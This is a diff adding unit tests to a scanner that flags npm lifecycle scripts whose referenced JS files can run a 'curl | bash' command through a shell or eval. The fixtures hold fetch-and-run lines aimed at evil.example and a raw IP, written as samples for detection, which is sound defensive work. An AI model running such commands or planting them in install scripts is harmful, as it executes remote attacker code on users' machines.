@@ -137,6 +137,18 @@ describe('lifecycle-scripts referenced files and robustness', () => {
     assert.equal(checkScripts({ postinstall: 'node install.js' }, 'x', 'p', tmp).length, 0);
   });
 
+  it('does not flag a curl|bash string a JS file cannot run (bun install.js)', () => {
+    pkg(tmp, {}, { 'install.js': 'const cp = require("child_process");\nlet installScript = "curl -fsSL https://bun.com/install | bash";\ncp.spawnSync(process.execPath, ["--version"]);\nthrow new Error("install using: " + installScript);\n' });
+    assert.equal(checkScripts({ postinstall: 'node install.js' }, 'bun', 'p', tmp).length, 0);
+  });
+
+  it('flags a curl|bash string a JS file can run through a shell', () => {
+    for (const sink of ['require("child_process").execSync(c)', 'require("child_process").spawnSync(c, { shell: true })', 'require("child_process").spawn("sh", ["-c", c])', 'eval(c)']) {
+      pkg(tmp, {}, { 'install.js': `const c = "curl -fsSL https://evil.example/i | bash";\n${sink};\n` });
+      assert.equal(checkScripts({ postinstall: 'node install.js' }, 'x', 'p', tmp).length, 1, sink);
+    }
+  });
+
   it('ignores referenced files outside the package directory', () => {
     fs.writeFileSync(path.join(tmp, 'outside.js'), 'curl http://1.2.3.4/x | bash');
     const inner = path.join(tmp, 'inner');
